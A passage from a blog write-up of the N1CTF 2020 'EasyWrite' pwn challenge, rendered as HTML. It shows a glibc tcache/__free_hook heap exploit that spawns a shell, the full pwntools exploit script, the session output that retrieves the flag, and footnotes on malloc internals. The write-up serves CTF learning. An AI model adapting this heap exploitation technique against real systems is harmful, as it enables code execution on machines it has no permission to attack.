+</span></span><span class=line><span class=cl><span class=mh>0xe6ce9</span> <span class=n>execve</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>rdx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>constraints</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>rsi</span><span class=p>]</span> <span class=o>==</span> <span class=n>NULL</span> <span class=o>||</span> <span class=n>rsi</span> <span class=o>==</span> <span class=n>NULL</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>rdx</span><span class=p>]</span> <span class=o>==</span> <span class=n>NULL</span> <span class=o>||</span> <span class=n>rdx</span> <span class=o>==</span> <span class=n>NULL</span>
+</span></span></code></pre></td></tr></table></div></div><p>Cross-referencing between this and the <code>gdb</code> context, it becomes apparent that there&rsquo;s no easy one_gadget to jump to.</p><p>After spending an hour or so staring at ROP gadgets<sup>6</sup> and potential one_gadget alternatives, I realised the rather obvious exploit path I was missing.</p><p><code>__free_hook(ptr)</code> is called with the <code>ptr</code> to be freed, which happens to be memory that we&rsquo;re in control of. Why not just jump to <code>system()</code>, and put <code>"/bin/sh"</code> at the front of the allocated memory?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fake_tcache</span> <span class=o>=</span> <span class=n>tcache_perthread_struct</span><span class=p>({</span><span class=n>free_hook</span><span class=o>-</span><span class=mh>0x8</span><span class=p>:</span> <span class=n>SIZE</span><span class=p>})</span>    <span class=c1># -8 to store /bin/sh</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Input your message:&#39;</span><span class=p>,</span> <span class=n>fake_tcache</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Where to write?:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>tcache_pointer</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Any last message?:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl><span class=err>$</span> <span class=n>echo</span> <span class=n>hello</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Sent</span> <span class=mh>0xb</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s1>&#39;echo hello</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Received</span> <span class=mh>0x6</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s1>&#39;hello</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>hello</span>
+</span></span><span class=line><span class=cl><span class=err>$</span>
+</span></span></code></pre></td></tr></table></div></div><p>It worked.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+] Opening connection to 124.156.183.246 on port 20000: Done
+</span></span><span class=line><span class=cl>[*] Switching to interactive mode
+</span></span><span class=line><span class=cl>[*] Got EOF while reading in interactive
+</span></span><span class=line><span class=cl>$ f
+</span></span></code></pre></td></tr></table></div></div><p>&mldr;locally. Not on remote.</p><p>Long story short, I was using <code>ld-linux.so --library-path</code> to simulate the remote <code>libc-2.31.so</code> environment, but <code>ld-linux</code> doesn&rsquo;t provide a <em>perfect</em> subsitute for running the actual libc bare-metal<sup>7</sup>.</p><p>Luckily, I had a machine with an extremely similar version of libc available. Debugging on that machine, I realised that the value of the <code>tcache_pointer</code> I had calculated earlier was off by 0x40 bytes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>tcache_pointer</span> <span class=o>=</span> <span class=mh>0x7facf8666530</span><span class=o>-</span><span class=mh>0x00007facf8473000</span><span class=o>+</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=o>-</span><span class=mh>0x40</span>
+</span></span></code></pre></td></tr></table></div></div><p>With that, we&rsquo;re finally done.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=mf>124.156.183.246</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>20000</span><span class=p>:</span> <span class=n>Done</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl><span class=err>$</span> <span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=nb>bin</span>
+</span></span><span class=line><span class=cl><span class=n>dev</span>
+</span></span><span class=line><span class=cl><span class=n>easywrite</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span>
+</span></span><span class=line><span class=cl><span class=n>lib</span>
+</span></span><span class=line><span class=cl><span class=n>lib32</span>
+</span></span><span class=line><span class=cl><span class=n>lib64</span>
+</span></span><span class=line><span class=cl><span class=n>libx32</span>
+</span></span><span class=line><span class=cl><span class=n>run</span><span class=o>.</span><span class=n>sh</span>
+</span></span><span class=line><span class=cl><span class=n>usr</span>
+</span></span><span class=line><span class=cl><span class=err>$</span> <span class=n>cat</span> <span class=n>flag</span>
+</span></span><span class=line><span class=cl><span class=n>n1ctf</span><span class=p>{</span><span class=mi>09</span><span class=n>b1e57ba44889be4f9ec8feee88b3be</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=err>$</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=full-code>Full code</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;easywrite&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc_database</span> <span class=o>=</span> <span class=s1>&#39;libc-database&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc-2.31.so&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;124.156.183.246&#39;</span><span class=p>,</span> <span class=mi>20000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>calc_base</span><span class=p>(</span><span class=s1>&#39;setbuf&#39;</span><span class=p>,</span> <span class=n>unpack_hex</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tcache_perthread_struct</span><span class=p>(</span><span class=n>fake_ptrs</span><span class=p>:</span> <span class=nb>dict</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;fake_ptrs has (address: size) key-pairs&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>csize2tidx</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>//</span><span class=mi>16</span> <span class=o>-</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>TCACHE_MAX_BINS</span> <span class=o>=</span> <span class=mh>0x40</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>counts</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>TCACHE_MAX_BINS</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=n>entries</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>TCACHE_MAX_BINS</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>addr</span><span class=p>,</span><span class=n>size</span> <span class=ow>in</span> <span class=n>fake_ptrs</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=n>tidx</span> <span class=o>=</span> <span class=n>csize2tidx</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>counts</span><span class=p>[</span><span class=n>tidx</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>        <span class=n>entries</span><span class=p>[</span><span class=n>tidx</span><span class=p>]</span> <span class=o>=</span> <span class=n>addr</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>p16</span><span class=p>,</span><span class=n>counts</span><span class=p>))</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>p64</span><span class=p>,</span><span class=n>entries</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>SIZE</span> <span class=o>=</span> <span class=mh>0x40</span> <span class=c1># size of the 2nd allocation</span>
+</span></span><span class=line><span class=cl><span class=n>tcache_pointer</span> <span class=o>=</span> <span class=mh>0x7f638ae58530</span><span class=o>-</span><span class=mh>0x00007f638ac65000</span><span class=o>+</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=o>-</span><span class=mh>0x40</span>
+</span></span><span class=line><span class=cl><span class=n>fake_tcache</span> <span class=o>=</span> <span class=n>tcache_perthread_struct</span><span class=p>({</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x8</span><span class=p>:</span> <span class=n>SIZE</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Input your message:&#39;</span><span class=p>,</span> <span class=n>fake_tcache</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Where to write?:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>tcache_pointer</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Any last message?:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=footnotes>Footnotes</h2><ol start=0><li>&mldr;which is practically identical what I said at the start of the writeup.</li><li>You can personally test this by overwriting all the values of <code>.got.plt</code> with garbage in <code>gdb</code>. The program exits gracefully.</li><li>Particularly, <code>__libc_IO_vtables</code> is useless here, because <code>main()</code> is committed to using raw <code>read()</code>s and <code>write()</code>s, instead of the standard I/O functions provided by libc.</li><li>The code for fastbin-malloc doesn&rsquo;t do much for us here. (Note that the fastbin_index for <code>malloc(0x30)</code> is 2)<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define fastbin_index(sz) ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
+</span></span></span><span class=line><span class=cl><span class=cp>#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=o>*</span><span class=nf>_int_malloc</span> <span class=p>(</span><span class=n>mstate</span> <span class=n>av</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>bytes</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>INTERNAL_SIZE_T</span> <span class=n>nb</span> <span class=o>=</span> <span class=p>...;</span>         <span class=cm>/* normalized request size */</span>
+</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>idx</span> <span class=o>=</span> <span class=p>...;</span>           <span class=cm>/* associated bin index */</span>
+</span></span><span class=line><span class=cl>    <span class=n>mchunkptr</span> <span class=n>victim</span><span class=p>;</span>                 <span class=cm>/* inspected/selected chunk */</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>this</span> <span class=n>is</span> <span class=n>a</span> <span class=n>fastbin</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>fastbin_index</span> <span class=p>(</span><span class=n>nb</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>mfastbinptr</span> <span class=o>*</span><span class=n>fb</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>fastbin</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>idx</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>mchunkptr</span> <span class=n>pp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>victim</span> <span class=o>=</span> <span class=o>*</span><span class=n>fb</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>victim</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>SINGLE_THREAD_P</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=o>*</span><span class=n>fb</span> <span class=o>=</span> <span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=c1>// else ...
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span> <span class=p>(</span><span class=n>__glibc_likely</span> <span class=p>(</span><span class=n>victim</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=n>size_t</span> <span class=n>victim_idx</span> <span class=o>=</span> <span class=n>fastbin_index</span> <span class=p>(</span><span class=n>chunksize</span> <span class=p>(</span><span class=n>victim</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>                <span class=c1>//if (__builtin_expect (victim_idx != idx, 0))
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=c1>//  malloc_printerr (&#34;malloc(): memory corruption (fast)&#34;);
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=n>check_remalloced_chunk</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>victim</span><span class=p>,</span> <span class=n>nb</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=cp>#if USE_TCACHE
+</span></span></span><span class=line><span class=cl><span class=cp></span>                <span class=p>...</span>
+</span></span><span class=line><span class=cl>            <span class=cp>#endif
+</span></span></span><span class=line><span class=cl><span class=cp></span>                <span class=kt>void</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=n>chunk2mem</span> <span class=p>(</span><span class=n>victim</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=n>alloc_perturb</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>bytes</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>p</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>....</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div>The most important thing to note here is that the pointer returned for the fastbin is always going to be the pointer directly located at <code>av->fastbinsY[idx]</code>, which our exploit can only replace with <em>another</em> valid heap pointer. A doubly allocated chunk of memory <em>might</em> be useful if there is more than one <code>free()</code>, but in this case, the fastbin is not very obviously useful.</li><li>I tried to dig through <code>malloc()</code> in IDA to find it:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>v5</span> <span class=o>=</span> <span class=n>unk_1F1520</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>unk_1F1520</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v4</span> <span class=o>&gt;=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>off_1EB2D0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>unk_1F1528</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>sub_9BAC0</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>off_1EB2D0</span> <span class=o>&lt;=</span> <span class=n>v4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=n>unk_1F1520</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>unk_1F1520</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>a4</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int16</span> <span class=o>*</span><span class=p>)(</span><span class=n>v5</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>v4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>v10</span> <span class=o>=</span> <span class=o>*</span><span class=n>a4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=n>a4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=n>v5</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>*</span> <span class=n>v4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>**</span><span class=p>)(</span><span class=n>v11</span> <span class=o>+</span> <span class=mi>128</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v11</span> <span class=o>+</span> <span class=mi>128</span><span class=p>)</span> <span class=o>=</span> <span class=o>*</span><span class=n>v7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>a4</span> <span class=o>=</span> <span class=n>v10</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>v7</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=n>v7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><code>v5</code> vaguely <em>appears</em> to match up with the global tcache pointer, but none of the global variables (<code>unk/off.*</code>) here point towards the actual location (offset 0x1f34f0) of the tcache pointer I found. Conclusion: I have no idea what&rsquo;s going on here.</li><li>A modified version of one_gadget can actually detect two more one_gadgets, but those are unsatisfiable too.</li><li>And I still think that this would be an interesting method. The <code>gdb</code> context shows that [rsp+0x10] is the location of the user-controlled <code>tcache</code> written earlier in the exploit. If a <code>mov rsp, [rsp+0x10]; pop %; ret</code> gadget (or anything effectively similar, like <code>pop; pop; pop rsp; pop; ret</code>) existed, it would be possible to write a ROP chain within the fake tcache itself.
+Staring at <code>ropper</code> and <code>ROPGadget</code> <em>and</em> <code>IDA</code> for an hour wasn&rsquo;t enough to eliminate this possiblity: <code>libc</code> really does have a lot of gadgets, and a symbolic engine might be able to find what I may have missed.</li><li>And if you know of a better way of running different libc versions, send me a ping <a href=https://github.com/152334H/pwnscripts/issues target=_blank rel="noopener noreffer">over here</a>; it&rsquo;d be really useful to know. So far I have tried<ul><li>Using <code>LD_PRELOAD</code>, which in the correct order (ld-linux.so first) will run the binary without crashing, although other issues still surface</li><li>Running <code>./ld-linux.so</code>, as outlined in the writeup. This has numerous side effects, including the actual binary getting allocated to an <code>0x7f.*</code> page instead of the expected <code>0x5.*</code> address</li><li><code>LD_LIBRARY_PATH</code>, which is finicky enough that I have not investigated it throughly in the past</li></ul></li></ol></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on August 20, 2022&nbsp;<a class=git-hash href=https://github.com/152334H/blog/commit/9043fe81da576b575f9034af7e5c6056f051ba22 target=_blank title="commit by 152334H(54623771+152334H@users.noreply.github.com) 9043fe81da576b575f9034af7e5c6056f051ba22: Content push">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>9043fe8</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://152334H.github.io/blog/n1ctf-2020-easywrite/ data-title="N1CTF 2020: EasyWrite" data-hashtags=pwn,writeup><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://152334H.github.io/blog/n1ctf-2020-easywrite/ data-hashtag=pwn><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://152334H.github.io/blog/n1ctf-2020-easywrite/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://152334H.github.io/blog/n1ctf-2020-easywrite/ data-title="N1CTF 2020: EasyWrite"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://152334H.github.io/blog/n1ctf-2020-easywrite/><i class="fab fa-reddit fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://152334H.github.io/blog/n1ctf-2020-easywrite/ data-title="N1CTF 2020: 